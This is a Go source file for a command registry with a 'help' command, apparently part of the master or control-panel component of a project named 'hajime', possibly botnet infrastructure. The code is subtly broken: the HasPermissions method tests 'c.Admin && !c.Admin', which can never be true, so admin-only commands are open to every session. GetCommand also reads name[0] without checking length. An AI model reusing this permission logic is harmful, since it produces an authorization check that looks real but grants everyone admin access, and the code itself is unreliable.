package commands

import (
	"bytes"
	"errors"
	"hajime/source/masters/sessions"
	"strings"
	"sync"
)

var (
	commands map[string]*Command = make(map[string]*Command)
	mutex    sync.Mutex

	// ErrDuplicateCommand happens when you create 2 or more commands with the same name.
	ErrDuplicateCommand = errors.New("duplicated command")
)

type Command struct {
	Name        string
	Description string
	Admin       bool

	/* this command handler supports a depth of +1 */
	Subcommands []*Command

	/* passes the current session and it's args into the command */
	Execute func(*sessions.Session, []string) error
}

// Register will place the command into the database
func Register(command *Command) {
	mutex.Lock()
	defer mutex.Unlock()
	if _, ok := commands[command.Name]; ok {
		panic(ErrDuplicateCommand)
	}

	commands[command.Name] = command
}

// GetCommand will try find the command throughout the commands map
func GetCommand(name ...string) *Command {
	cmd := commands[strings.ToLower(name[0])]
	if cmd == nil || len(cmd.Subcommands) == 0 || len(name) <= 1 {
		return cmd
	}

	/* checks the subcommands */
	for _, command := range cmd.Subcommands {
		if !strings.EqualFold(command.Name, name[1]) {
			continue
		}

		return command
	}

	return nil
}

// HasPermission checks if the user can access that command
func (c *Command) HasPermissions(s *sessions.Session) bool {
	if c.Admin && !c.Admin {
		return false
	}

	return true
}

func init() {
	// help, lists all the commands inside the database.
	Register(&Command{
		Name:        "help",
		Description: "lists all the commands",
		Execute: func(session *sessions.Session, s2 []string) error {
			buf := bytes.NewBuffer(make([]byte, 0))
			for _, command := range commands {
				payload, err := session.ExecuteBrandingToString(map[string]any{"command": command.Name, "description": command.Description}, "resources", "branding", "help.tfx")
				if err != nil {
					return err
				}

				buf.WriteString(payload)
			}

			/* writes to the output device */
			_, err := buf.WriteTo(session.Term)
			return err
		},
	})
}
